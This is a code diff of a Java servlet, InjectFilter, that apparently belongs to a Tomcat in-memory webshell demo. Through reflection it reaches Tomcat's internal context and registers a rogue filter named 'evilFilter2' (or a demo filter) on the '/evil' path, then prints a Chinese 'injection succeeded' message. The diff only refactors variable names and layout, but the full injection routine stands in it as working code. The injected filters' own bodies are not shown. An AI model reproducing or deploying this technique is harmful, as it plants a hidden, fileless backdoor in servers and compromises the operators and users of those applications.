@@ -30,44 +30,37 @@ public class InjectFilter extends HttpServlet {
             StandardContext0.setAccessible(true);
             applicationContext = (ApplicationContext) StandardContext0.get(sc);
 
-            StandardContext sContext;
+            StandardContext standardContext;
             Field StandardContext1 = applicationContext.getClass().getDeclaredField("context");
             StandardContext1.setAccessible(true);
-            sContext = (StandardContext) StandardContext1.get(applicationContext);
+            standardContext = (StandardContext) StandardContext1.get(applicationContext);
 
-            java.lang.reflect.Field filerConfig = sContext.getClass().getDeclaredField("filterConfigs");
+            java.lang.reflect.Field filerConfig = standardContext.getClass().getDeclaredField("filterConfigs");
             filerConfig.setAccessible(true);
-            Map filterConfigs = (Map) filerConfig.get(sContext);
+            Map filterConfigs = (Map) filerConfig.get(standardContext);
 
             Filter injectFilter;
 
-            if (filterConfigs.get(name) != null) {
-                name = "evilFilter2";
-                injectFilter = new injectFilterDemo2();
-            } else {
-                injectFilter = new injectFilterDemo();
-            }
-
-
+            if (filterConfigs.get(name) != null) { name = "evilFilter2"; injectFilter = new injectFilterDemo2();
+            } else { injectFilter = new injectFilterDemo(); }
             FilterDef filterDef = new FilterDef();
-            filterDef.setFilter(injectFilter);
-            filterDef.setFilterName(name);
+            filterDef.setFilter(injectFilter);filterDef.setFilterName(name);
             filterDef.setFilterClass(injectFilter.getClass().getName());
-            sContext.addFilterDef(filterDef);
+            standardContext.addFilterDef(filterDef);
 
             FilterMap filterMap = new FilterMap();
-            filterMap.addURLPattern("/evil");
-            filterMap.setFilterName(name);
+            filterMap.addURLPattern("/evil");filterMap.setFilterName(name);
             filterMap.setDispatcher(DispatcherType.REQUEST.name());
-            sContext.addFilterMap(filterMap);
+            standardContext.addFilterMap(filterMap);
 
             Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class ,FilterDef.class);
             constructor.setAccessible(true);
-            ApplicationFilterConfig afc = (ApplicationFilterConfig) constructor.newInstance(sContext ,filterDef);
+            ApplicationFilterConfig afc = (ApplicationFilterConfig) constructor.newInstance(standardContext ,filterDef);
             filterConfigs.put(name,afc);
 
             System.out.println("注入成功");
             System.out.println(filterConfigs);
+
 
 
         } catch (NoSuchFieldException e) {
@@ -82,4 +75,5 @@ public class InjectFilter extends HttpServlet {
             throw new RuntimeException(e);
         }
     }
+
 }
